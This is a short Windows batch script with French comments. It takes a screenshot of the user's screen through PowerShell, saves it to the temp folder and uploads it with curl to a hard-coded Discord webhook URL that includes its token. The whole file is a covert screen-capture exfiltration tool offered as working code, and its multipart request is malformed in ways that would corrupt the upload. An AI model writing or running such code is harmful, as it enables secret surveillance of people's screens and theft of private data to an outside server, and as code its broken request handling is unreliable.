@echo off
setlocal enabledelayedexpansion

rem Définir l'URL du webhook Discord
set "webhookUrl=https://discord.com/api/webhooks/1151525024088477868/uRlaL-EA8gyLBxmjfzoZg5aAB1QT24phwo9XA13_rA2tai3rMHp2E7KqZEKN9sMS54kF"

rem Définir le chemin d'accès complet pour enregistrer la capture d'écran dans le répertoire temporaire de l'utilisateur
set "fileName=%TEMP%\screenshot.png"

rem Prendre une capture d'écran avec PowerShell et enregistrer l'image
powershell.exe -Command "$screenshot = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screenshot.Width, $screenshot.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screenshot.Location, [System.Drawing.Point]::Empty, $screenshot.Size); $bitmap.Save('%fileName%', [System.Drawing.Imaging.ImageFormat]::Png)"

rem Créer la requête HTTP multipart/form-data
echo Content-Disposition: form-data; name="file"; filename="screenshot.png" > "%TEMP%\request_body.txt"
echo Content-Type: application/octet-stream >> "%TEMP%\request_body.txt"
echo. >> "%TEMP%\request_body.txt"
type "%fileName%" >> "%TEMP%\request_body.txt"
echo. >> "%TEMP%\request_body.txt"
echo --boundary-- >> "%TEMP%\request_body.txt"

rem Envoyer la requête à l'URL du webhook Discord avec curl
curl -X POST -H "Content-Type: multipart/form-data; boundary=boundary" -d @"%TEMP%\request_body.txt" "%webhookUrl%"

echo Capture d'écran envoyée avec succès au webhook Discord.
